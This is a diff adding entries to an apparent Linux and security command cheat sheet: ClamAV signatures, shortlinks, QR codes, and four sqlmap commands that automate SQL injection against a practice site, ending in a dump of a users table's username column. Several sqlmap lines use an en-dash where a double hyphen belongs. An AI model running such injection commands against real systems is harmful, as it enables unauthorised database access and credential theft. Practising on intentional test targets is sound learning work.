@@ -216,4 +216,29 @@ passwd -S
 
 # Set password expirations dates
 sudo nano /etc/login.defs
+
+# List malwares signatures on ClamAV
+sigtool --list-sigs
+
+# Generate shortlinks
+curl -s -i https://tinyurl.com/api-create.php?url=https://my.link
+
+# Generate QR Code
+sudo apt install qrencode
+qrencode -o qr_code.png "https://my.link"
+
+# Check if url is vulnerable to clickjacker
+https://clickjacker.io
+
+# Automate SQL Injection - List dbs
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 –dbs
+
+# Automate SQL Injection - List tables
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables
+
+# Automate SQL Injection - List columns
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –columns
+
+# Automate SQL Injection - dump table/column
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
 ```
